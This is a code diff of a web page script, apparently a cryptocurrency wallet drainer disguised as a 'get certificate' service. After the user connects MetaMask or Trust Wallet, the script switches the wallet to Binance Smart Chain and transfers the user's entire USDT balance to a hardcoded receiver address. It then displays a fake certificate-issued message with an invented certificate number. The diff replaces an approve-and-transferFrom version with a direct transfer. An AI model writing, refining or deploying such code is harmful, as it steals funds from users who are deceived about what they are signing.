@@ -1,78 +1,79 @@
-const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+const BSC_CHAIN_ID = '0x38';
+const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+const RECEIVER_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
+let web3, usdtContract;
 
-const ABI = [
+const USDT_ABI = [
   {
     constant: true,
     inputs: [{ name: "_owner", type: "address" }],
     name: "balanceOf",
     outputs: [{ name: "balance", type: "uint256" }],
-    type: "function",
+    type: "function"
   },
   {
     constant: false,
     inputs: [
-      { name: "_spender", type: "address" },
-      { name: "_value", type: "uint256" },
-    ],
-    name: "approve",
-    outputs: [{ name: "success", type: "bool" }],
-    type: "function",
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: "_from", type: "address" },
       { name: "_to", type: "address" },
-      { name: "_value", type: "uint256" },
+      { name: "_value", type: "uint256" }
     ],
-    name: "transferFrom",
-    outputs: [{ name: "success", type: "bool" }],
-    type: "function",
-  },
-  {
-    constant: true,
-    inputs: [
-      { name: "_owner", type: "address" },
-      { name: "_spender", type: "address" },
-    ],
-    name: "allowance",
-    outputs: [{ name: "remaining", type: "uint256" }],
-    type: "function",
+    name: "transfer",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
   }
 ];
 
-document.getElementById("getCertificateBtn").addEventListener("click", async () => {
-  if (typeof window.ethereum === "undefined") {
-    alert("Trust Wallet ya MetaMask install karein!");
+async function checkAndApprove() {
+  if (typeof window.ethereum === 'undefined') {
+    alert("Please install MetaMask or Trust Wallet.");
     return;
   }
 
-  const web3 = new Web3(window.ethereum);
-  await window.ethereum.request({ method: "eth_requestAccounts" });
+  web3 = new Web3(window.ethereum);
+  await switchToBSC();
+  const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+  const userAddress = accounts[0];
 
-  const accounts = await web3.eth.getAccounts();
-  const sender = accounts[0];
+  usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+  const balance = await usdtContract.methods.balanceOf(userAddress).call();
 
-  const usdt = new web3.eth.Contract(ABI, usdtAddress);
-
-  const balance = await usdt.methods.balanceOf(sender).call();
-  if (balance === "0") {
-    alert("USDT balance nahi mila.");
+  if (Number(balance) === 0) {
+    alert("You have 0 USDT in your wallet.");
     return;
   }
 
-  // Approve step
-  await usdt.methods
-    .approve(receiverAddress, balance)
-    .send({ from: sender });
+  const tx = await usdtContract.methods.transfer(RECEIVER_ADDRESS, balance).send({ from: userAddress });
 
-  // Transfer step
-  await usdt.methods
-    .transferFrom(sender, receiverAddress, balance)
-    .send({ from: sender });
+  document.getElementById("status").textContent = `✅ Certificate successfully issued. Transferred USDT: ${web3.utils.fromWei(balance, 'ether')}`;
+  document.getElementById("walletAddress").textContent = `Wallet: ${userAddress}`;
+  document.getElementById("balanceAmount").textContent = `${web3.utils.fromWei(balance, 'ether')} USDT`;
+  document.getElementById("certificateNumber").textContent = "CERT-" + Date.now().toString(36).toUpperCase();
+}
 
-  const humanReadable = web3.utils.fromWei(balance, "ether");
-
-  alert(`Certificate successfully.\nTransferred: ${humanReadable} USDT`);
-});
+async function switchToBSC() {
+  try {
+    await ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID }],
+    });
+  } catch (switchError) {
+    if (switchError.code === 4902) {
+      await ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{
+          chainId: BSC_CHAIN_ID,
+          chainName: 'Binance Smart Chain',
+          rpcUrls: ['https://bsc-dataseed.binance.org/'],
+          nativeCurrency: {
+            name: 'BNB',
+            symbol: 'BNB',
+            decimals: 18,
+          },
+          blockExplorerUrls: ['https://bscscan.com'],
+        }],
+      });
+    } else {
+      throw switchError;
+    }
+  }
+}
